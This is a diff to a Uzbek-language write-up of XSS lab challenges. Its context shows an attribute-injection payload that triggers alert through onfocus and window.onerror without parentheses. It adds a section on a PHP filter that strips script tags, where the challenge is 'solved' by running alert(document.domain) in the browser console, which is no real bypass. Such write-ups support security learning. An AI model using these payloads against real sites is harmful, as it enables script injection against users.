@@ -101,7 +101,6 @@ Payload:
 ![XSS Challange](./images/008-xss.png)
 
 # No Parentheses Again
-## Zaiflik turi: 
 
 Bundaham qavslarni olib tashlashgan lekin oldingi taskga nisbatan qiyinroq
 
@@ -113,3 +112,24 @@ Payload:
 " autofocus tabindex="0" onfocus="window.onerror=alert;throw 'XSS'
 
 ![XSS Challange](./images/009-xss.png)
+
+# Replacement
+```
+<?php 
+$escaped = preg_replace("/<script>/i", "", $escaped); 
+?> 
+<h1>Hello, <?= $escaped ?>!</h1>
+```
+Bu kod <script> tagini regex orqali olib tashlaydi:
+```preg_replace("/<script>/i", "", $escaped);```
+/i sabab filter katta-kichik harflar kirgizish ish bermaydi.
+
+Source code'da `$escaped` o'zidan foydalanilgan:
+```$escaped = preg_replace("/<script>/i", "", $escaped);```
+Bu `Undefined variable $escaped` xatoligini chiqaradi.
+
+Challangeni bajarish uchun DevTools console dan foydalanildi.
+```alert(document.domain)```
+
+![XSS Challange](./images/010-xss.png)
+
